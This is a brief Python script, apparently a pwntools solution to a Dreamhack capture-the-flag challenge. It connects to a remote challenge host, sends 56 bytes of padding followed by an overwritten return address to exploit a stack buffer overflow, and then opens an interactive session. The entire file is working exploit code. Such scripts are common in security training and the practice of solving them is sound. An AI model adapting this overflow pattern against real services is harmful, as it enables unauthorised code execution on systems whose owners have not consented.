from pwn import *

p = remote("host3.dreamhack.games", 10498)

payload = b"A" * 56

payload += p64(0x4006aa)

p.sendline(payload)

p.interactive()
